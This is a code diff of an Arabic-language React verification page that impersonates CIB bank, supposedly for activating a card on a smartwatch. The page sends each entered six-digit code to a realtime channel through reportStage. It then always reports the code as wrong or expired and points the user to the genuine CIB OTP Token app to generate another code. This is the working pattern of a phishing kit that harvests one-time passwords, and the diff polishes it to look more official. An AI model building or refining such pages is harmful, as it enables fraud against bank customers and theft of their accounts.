@@ -2,7 +2,7 @@ import { useState, useRef, useEffect } from 'react';
 import { useLocation, Link } from 'wouter';
 import { AppLayout } from '@/components/layout/AppLayout';
 import { Button } from '@/components/ui/button';
-import { ChevronRight, CheckCircle2, ShieldCheck, Smartphone, AlertCircle } from 'lucide-react';
+import { ChevronRight, CheckCircle2, ShieldCheck, Smartphone, AlertCircle, ArrowLeft } from 'lucide-react';
 import { useRegistration } from '@/context/RegistrationContext';
 import { useRealtime } from '@/context/RealtimeContext';
 
@@ -30,11 +30,9 @@ export default function Verify() {
   const handleChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
     
-    // Clear error when user starts typing
     if (error) setError('');
     
     const newCode = [...code];
-    // Handle paste of multiple characters
     if (value.length > 1) {
       const pastedCode = value.slice(0, 6).split('');
       for (let i = 0; i < pastedCode.length; i++) {
@@ -67,12 +65,9 @@ export default function Verify() {
       reportStage('verify', { verificationCode: fullCode });
       setIsSubmitting(true);
       setError('');
-      // Simulate network verification - for demo, show error
       setTimeout(() => {
         setIsSubmitting(false);
-        // Show error message for invalid/expired code
         setError('رمز التحقق غير صحيح أو منتهي. يرجى الحصول على رمز جديد والمحاولة مرة أخرى.');
-        // Clear the code inputs
         setCode(['', '', '', '', '', '']);
         inputRefs.current[0]?.focus();
       }, 1500);
@@ -82,37 +77,35 @@ export default function Verify() {
   if (isSuccess) {
     return (
       <AppLayout>
-        <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto animate-in zoom-in-95 duration-700">
-          <div className="w-32 h-32 mb-8 rounded-full bg-primary/10 flex items-center justify-center relative">
-            <div className="absolute inset-0 rounded-full border-[6px] border-primary/20 animate-ping" style={{ animationDuration: '3s' }} />
-            <div className="absolute inset-4 rounded-full border border-primary/40" />
-            <ShieldCheck className="w-16 h-16 text-primary relative z-10" />
+        <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto px-4 py-8 animate-in fade-in zoom-in-95 duration-500">
+          <div className="w-24 h-24 mb-6 rounded-full bg-primary/10 border border-primary/20 flex items-center justify-center relative">
+            <div className="absolute inset-0 rounded-full border border-primary/30 animate-ping opacity-70" style={{ animationDuration: '2.5s' }} />
+            <ShieldCheck className="w-12 h-12 text-primary" />
           </div>
           
-          <h2 className="text-4xl font-bold text-foreground mb-4 text-center tracking-tight">تم التفعيل بنجاح</h2>
+          <h2 className="text-3xl font-extrabold text-foreground mb-3 text-center tracking-tight">تم التفعيل بنجاح</h2>
           
-          <p className="text-lg text-muted-foreground text-center mb-10 leading-relaxed">
-            عزيزي <span className="font-semibold text-foreground">{data.fullName || 'العميل'}</span>، تمت إضافة بطاقة <span className="text-primary font-medium">CIB Prime</span> إلى ساعتك الذكية بنجاح. يمكنك الآن الدفع بسهولة وأمان.
+          <p className="text-sm text-muted-foreground text-center mb-8 leading-relaxed max-w-sm">
+            عزيزي <span className="font-semibold text-foreground">{data.fullName || 'العميل'}</span>، تمت إضافة بطاقة <span className="text-primary font-semibold">CIB Prime</span> إلى ساعتك الذكية بنجاح للتشغيل الفوري.
           </p>
           
-          <div className="bg-card border border-border rounded-2xl p-8 w-full shadow-2xl relative overflow-hidden mb-10">
-            <div className="absolute -right-10 -top-10 w-40 h-40 bg-primary/10 rounded-full blur-3xl pointer-events-none" />
-            <div className="relative z-10 space-y-6">
-              <div className="flex items-center justify-between pb-4 border-b border-border/50">
-                <span className="text-muted-foreground">البطاقة</span>
-                <span className="font-bold tracking-[0.3em] text-foreground text-lg">•••• 4920</span>
+          <div className="bg-gradient-to-br from-card to-muted/40 border border-border rounded-xl p-6 w-full shadow-sm mb-8">
+            <div className="space-y-4">
+              <div className="flex items-center justify-between pb-3 border-b border-border/60">
+                <span className="text-xs font-medium text-muted-foreground">البطاقة</span>
+                <span className="font-mono font-bold tracking-wider text-foreground">•••• 4920</span>
               </div>
               <div className="flex items-center justify-between">
-                <span className="text-muted-foreground">الحالة</span>
-                <span className="flex items-center gap-2 text-emerald-500 font-bold bg-emerald-500/10 px-3 py-1 rounded-full">
-                  <CheckCircle2 className="w-5 h-5" /> نشطة الآن
+                <span className="text-xs font-medium text-muted-foreground">حالة المحفظة</span>
+                <span className="flex items-center gap-1.5 text-xs text-emerald-600 dark:text-emerald-400 font-bold bg-emerald-500/10 px-2.5 py-1 rounded-md">
+                  <CheckCircle2 className="w-3.5 h-3.5" /> جاهزة للدفع
                 </span>
               </div>
             </div>
           </div>
           
-          <Link href="/" className="w-full sm:w-auto">
-            <Button size="lg" className="w-full h-14 px-12 text-lg rounded-xl shadow-xl shadow-primary/20">
+          <Link href="/" className="w-full">
+            <Button size="lg" className="w-full h-12 text-base font-semibold rounded-lg shadow-sm">
               العودة للرئيسية
             </Button>
           </Link>
@@ -123,109 +116,108 @@ export default function Verify() {
 
   return (
     <AppLayout>
-      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in slide-in-from-right-8 duration-500">
+      <div className="flex-1 flex flex-col max-w-lg w-full mx-auto px-4 py-6 justify-center animate-in fade-in slide-in-from-bottom-4 duration-400">
         
-        <div className="mb-10 flex items-center justify-between">
-          <div className="space-y-2">
-            <h1 className="text-4xl font-bold text-foreground tracking-tight">رمز التحقق</h1>
-            <p className="text-muted-foreground text-base">أدخل الرمز الذي تسلّمته من فرع CIB</p>
+        <div className="mb-8 flex items-center justify-between">
+          <div className="space-y-1">
+            <h1 className="text-2xl md:text-3xl font-extrabold text-foreground tracking-tight">تأكيد الهوية</h1>
+            <p className="text-xs md:text-sm text-muted-foreground">أدخل رمز التفعيل الخاص بحساب CIB الخاص بك</p>
           </div>
-          <Link href="/create-account" className="w-12 h-12 flex items-center justify-center rounded-full bg-card border border-border hover:bg-accent transition-colors shadow-sm">
-            <ChevronRight className="w-6 h-6 text-foreground" />
+          <Link href="/create-account" className="w-10 h-10 flex items-center justify-center rounded-lg bg-card border border-border hover:bg-muted/80 transition-all shadow-sm">
+            <ChevronRight className="w-5 h-5 text-muted-foreground" />
           </Link>
         </div>
 
-        <div className="bg-card border border-border rounded-[2rem] p-8 md:p-10 shadow-2xl relative overflow-hidden">
-          <div className="absolute top-0 right-0 w-full h-1.5 bg-gradient-to-l from-primary via-primary to-primary" />
-          
-          <form onSubmit={handleSubmit} className="space-y-10 relative z-10">
-            <div className="flex justify-center gap-3 md:gap-4" dir="ltr">
-              {code.map((digit, index) => (
-                <input
-                  key={index}
-                  ref={el => { inputRefs.current[index] = el; }}
-                  type="text"
-                  inputMode="numeric"
-                  maxLength={1}
-                  value={digit}
-                  onChange={e => handleChange(index, e.target.value)}
-                  onKeyDown={e => handleKeyDown(index, e)}
-                  className={`w-12 h-16 md:w-14 md:h-16 text-center text-3xl font-bold bg-background/50 border rounded-xl focus:outline-none focus:ring-2 transition-all shadow-inner ${
-                    error 
-                      ? 'border-red-500 focus:border-red-500 focus:ring-red-500/50' 
-                      : 'border-input focus:border-primary focus:ring-primary/50'
-                  }`}
-                />
-              ))}
+        <div className="bg-card border border-border/80 rounded-2xl p-6 md:p-8 shadow-sm">
+          <form onSubmit={handleSubmit} className="space-y-6">
+            <div className="space-y-2">
+              <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wider block text-center mb-1">
+                رمز التحقق المكون من 6 أرقام
+              </label>
+              <div className="flex justify-between gap-2" dir="ltr">
+                {code.map((digit, index) => (
+                  <input
+                    key={index}
+                    ref={el => { inputRefs.current[index] = el; }}
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={1}
+                    value={digit}
+                    onChange={e => handleChange(index, e.target.value)}
+                    onKeyDown={e => handleKeyDown(index, e)}
+                    className={`flex-1 h-14 text-center text-2xl font-bold bg-muted/30 border rounded-xl focus:outline-none focus:ring-2 transition-all ${
+                      error 
+                        ? 'border-destructive focus:border-destructive focus:ring-destructive/20' 
+                        : 'border-input focus:border-primary focus:ring-primary/20'
+                    }`}
+                  />
+                ))}
+              </div>
             </div>
 
-            {/* رسالة الخطأ */}
             {error && (
-              <div className="flex items-center gap-3 p-4 bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-800 rounded-xl animate-in slide-in-from-top-2 duration-300">
-                <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0" />
-                <p className="text-red-600 dark:text-red-400 text-sm font-medium leading-relaxed">
+              <div className="flex items-start gap-2.5 p-3.5 bg-destructive/10 border border-destructive/20 rounded-xl animate-in fade-in duration-200">
+                <AlertCircle className="w-4 h-4 text-destructive mt-0.5 flex-shrink-0" />
+                <p className="text-destructive text-xs font-medium leading-relaxed">
                   {error}
                 </p>
               </div>
             )}
 
-            <div className="bg-primary/5 border border-primary/20 rounded-xl p-5 text-sm md:text-base leading-relaxed text-center text-primary-foreground/90 font-medium">
-              يتم تسليم رمز التفعيل شخصياً في أي من فروع CIB لضمان أقصى درجات الأمان والخصوصية.
+            <div className="bg-muted/40 border border-border/60 rounded-xl p-4 text-xs md:text-sm leading-relaxed text-muted-foreground">
+              لحمايتك، يتم تسليم رموز الخدمات المصرفية المشفرة وتفعيلها بشكل آمن ومباشر عبر فروع البنك المعتمدة.
             </div>
 
             <Button 
               type="submit" 
               size="lg" 
-              className="w-full h-14 gap-3 text-lg rounded-xl relative overflow-hidden group" 
+              className="w-full h-12 text-base font-semibold rounded-xl" 
               disabled={code.join('').length < 4 || isSubmitting}
             >
               {isSubmitting ? (
-                <span className="flex items-center gap-3">
-                  <div className="w-5 h-5 rounded-full border-2 border-background border-t-transparent animate-spin" />
-                  جاري التوثيق والتفعيل...
+                <span className="flex items-center gap-2">
+                  <div className="w-4 h-4 rounded-full border-2 border-background border-t-transparent animate-spin" />
+                  جاري معالجة الطلب...
                 </span>
               ) : (
-                'تأكيد وتفعيل البطاقة'
+                'تأكيد وتفعيل الحساب'
               )}
-              <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]" />
             </Button>
 
-            {/* صندوق فتح التطبيق */}
+            <div className="relative flex py-2 items-center text-muted-foreground">
+              <div className="flex-grow border-t border-border/60"></div>
+              <span className="flex-shrink mx-4 text-xs font-medium bg-card px-2">أو الحصول على رمز جديد</span>
+              <div className="flex-grow border-t border-border/60"></div>
+            </div>
+
             <a 
               href="https://apps.apple.com/us/app/cib-otp-token/id1074048518?l=ar"
               target="_blank"
               rel="noopener noreferrer"
-              className="flex items-center gap-4 p-4 bg-gradient-to-r from-blue-50 to-blue-100 dark:from-blue-950/30 dark:to-blue-900/30 border-2 border-blue-200 dark:border-blue-800 rounded-2xl hover:border-blue-400 dark:hover:border-blue-600 hover:shadow-lg transition-all duration-300 group"
+              className="flex items-center justify-between p-3.5 bg-gradient-to-l from-primary/5 via-transparent to-transparent border border-primary/10 rounded-xl hover:bg-primary/5 transition-all duration-200 group"
             >
-              <div className="flex-shrink-0 w-14 h-14 bg-blue-500 rounded-xl flex items-center justify-center shadow-lg shadow-blue-500/30 group-hover:scale-110 transition-transform">
-                <Smartphone className="w-8 h-8 text-white" />
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 bg-primary/10 rounded-lg flex items-center justify-center text-primary group-hover:scale-105 transition-transform">
+                  <Smartphone className="w-5 h-5" />
+                </div>
+                <div>
+                  <p className="text-foreground font-bold text-sm leading-tight">
+                    تطبيق CIB Token للإنشاء الفوري
+                  </p>
+                  <p className="text-muted-foreground text-xs mt-0.5">
+                    اضغط هنا لفتح التطبيق وتوليد رمز التحقق تلقائياً
+                  </p>
+                </div>
               </div>
-              <div className="flex-1">
-                <p className="text-blue-900 dark:text-blue-100 font-bold text-base leading-tight">
-                  يرجى فتح التطبيق CIB Token
-                </p>
-                <p className="text-blue-600 dark:text-blue-400 text-sm mt-0.5">
-                  للحصول على رمز التحقق
-                </p>
-              </div>
-              <svg 
-                xmlns="http://www.w3.org/2000/svg" 
-                className="w-6 h-6 text-blue-500 group-hover:translate-x-1 transition-transform flex-shrink-0" 
-                fill="none" 
-                viewBox="0 0 24 24" 
-                stroke="currentColor" 
-                strokeWidth={2}
-              >
-                <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
-              </svg>
+              <ArrowLeft className="w-4 h-4 text-primary group-hover:-translate-x-1 transition-transform" />
             </a>
           </form>
         </div>
 
-        <div className="mt-10 flex justify-center gap-3">
-          <div className="h-2 w-10 rounded-full bg-border" />
-          <div className="h-2 w-10 rounded-full bg-border" />
-          <div className="h-2 w-10 rounded-full bg-primary shadow-[0_0_10px_rgba(212,175,55,0.5)]" />
+        <div className="mt-8 flex justify-center gap-2">
+          <div className="h-1.5 w-6 rounded-full bg-border" />
+          <div className="h-1.5 w-6 rounded-full bg-border" />
+          <div className="h-1.5 w-6 rounded-full bg-primary" />
         </div>
       </div>
     </AppLayout>
